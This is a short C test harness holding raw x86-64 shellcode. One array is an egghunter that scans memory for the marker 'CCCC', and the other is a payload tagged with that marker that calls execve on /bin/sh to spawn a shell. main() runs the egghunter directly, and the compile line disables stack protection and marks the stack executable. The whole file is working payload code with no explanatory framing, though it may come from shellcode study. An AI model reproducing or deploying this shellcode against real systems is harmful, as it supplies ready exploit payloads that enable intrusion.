// compile: gcc -fno-stack-protector -z execstack -o harness harness.c

#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = \
"\x48\x31\xd2\x48\x89\xd6\x48\xba\x00\x00\x00\x55\x55\x55\x00\x00\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x08\x48\x31\xc0\x48\x83\xc0\x15\x0f\x05\x3c\xf2\x74\xe7\xb8\x42\x43\x43\x43\xff\xc0\xaf\x75\xe2\xff\xe7";

unsigned char code[] = \
"\x43\x43\x43\x43\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main()
{
   printf("Shellcode memory address:  %p\n", code);
   int (*ret)() = (int(*)())egghunter;
   ret();
   return 0;
}